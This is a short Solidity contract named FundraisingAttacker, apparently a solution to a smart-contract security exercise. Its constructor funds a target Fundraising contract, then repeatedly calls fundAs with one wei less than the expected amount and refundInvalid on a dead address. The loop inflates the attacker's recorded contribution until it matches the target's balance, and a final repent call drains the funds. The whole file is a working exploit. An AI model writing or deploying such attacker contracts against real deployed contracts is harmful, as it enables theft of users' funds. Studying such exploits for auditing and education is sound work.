pragma solidity 0.8.9;

import './Fundraising.sol';

contract FundraisingAttacker {
    
    constructor(Fundraising instance) payable {
        require(msg.value >= 10000 gwei);
        
        instance.fund{value:1000 gwei}();
        uint256 amount;

        (amount, ) = instance.collaborations(address(this));

        while(amount < instance.getBalance()) {
            // Funding as any address will work
            instance.fundAs{value:(1000 gwei) - 1}(0x000000000000000000000000000000000000dEaD);
            instance.refundInvalid(0x000000000000000000000000000000000000dEaD);
            (amount, ) = instance.collaborations(address(this));
        }

        instance.repent();
    }

    receive() external payable { }

}
